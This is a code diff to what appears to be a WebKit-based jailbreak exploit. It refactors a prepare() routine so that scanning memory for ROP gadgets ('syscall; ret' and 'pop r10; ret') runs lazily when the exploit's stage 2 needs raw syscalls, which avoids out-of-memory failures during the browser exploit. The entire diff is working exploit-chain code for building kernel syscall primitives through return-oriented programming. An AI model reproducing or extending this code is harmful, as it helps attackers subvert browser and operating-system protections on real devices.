@@ -251,17 +251,27 @@ async function prepare(p) {
         }
         return null;
     }
-    try {
-        const gSyscall = scanWkPat([0x0f, 0x05, 0xc3]);
-        const gPopR10 = scanWkPat([0x41, 0x5a, 0xc3]);
-        if (gSyscall !== null) gadgets["syscall"] = gSyscall;
-        if (gPopR10 !== null) gadgets["pop r10"] = gPopR10;
-        rawSyscall = (gSyscall !== null);
-        jbmark(rawSyscall ? "WK-RAW-SYSCALL" : "WK-NO-RAW-SYSCALL",
-            "syscall=" + (gSyscall === null ? "none" : "0x" + gSyscall.toString())
-            + " popr10=" + (gPopR10 === null ? "none" : "0x" + gPopR10.toString()));
-    } catch (e) {
-        jbmark("WK-RAW-THREW", String(e && e.message || e).slice(0, 40));
+    // Lazy: run the scan only when the first stub-less syscall is needed
+    // (Run Exploit / Stage 2), NOT during prepare() at WebKit-finish where the
+    // heap is tight — any extra work there risks the "not enough free memory"
+    // dialog. Returns true when the `syscall;ret` gadget was found.
+    let rawScanned = false;
+    function scanRawGadgets() {
+        if (rawScanned) return rawSyscall;
+        rawScanned = true;
+        try {
+            const gSyscall = scanWkPat([0x0f, 0x05, 0xc3]);
+            const gPopR10 = scanWkPat([0x41, 0x5a, 0xc3]);
+            if (gSyscall !== null) gadgets["syscall"] = gSyscall;
+            if (gPopR10 !== null) gadgets["pop r10"] = gPopR10;
+            rawSyscall = (gSyscall !== null);
+            jbmark(rawSyscall ? "WK-RAW-SYSCALL" : "WK-NO-RAW-SYSCALL",
+                "syscall=" + (gSyscall === null ? "none" : "0x" + gSyscall.toString())
+                + " popr10=" + (gPopR10 === null ? "none" : "0x" + gPopR10.toString()));
+        } catch (e) {
+            jbmark("WK-RAW-THREW", String(e && e.message || e).slice(0, 40));
+        }
+        return rawSyscall;
     }
 
     async function wait_for_worker() {
@@ -359,7 +369,8 @@ async function prepare(p) {
         libKernelBase: libKernelBase,
         nogc: nogc,
         syscalls: syscalls,
-        rawSyscall: rawSyscall,
+        scanRawGadgets: scanRawGadgets,
+        get rawSyscall() { return rawSyscall; },
         gadgets: gadgets
     };
 
